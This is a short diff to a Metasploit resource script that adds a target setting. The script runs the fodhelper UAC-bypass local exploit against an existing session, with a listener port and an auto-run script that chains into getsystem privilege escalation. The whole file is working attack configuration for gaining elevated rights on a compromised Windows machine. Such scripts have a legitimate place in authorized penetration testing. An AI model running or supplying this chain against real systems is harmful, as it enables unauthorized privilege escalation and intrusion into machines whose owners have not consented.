@@ -1,5 +1,6 @@
 use exploit/windows/local/bypassuac_fodhelper
 set LPORT 8444
 set session 1
+set target 1
 set AutoRunScript multi_console_command -r {path to this folder}/autorun_getsystem.rc
 exploit -z
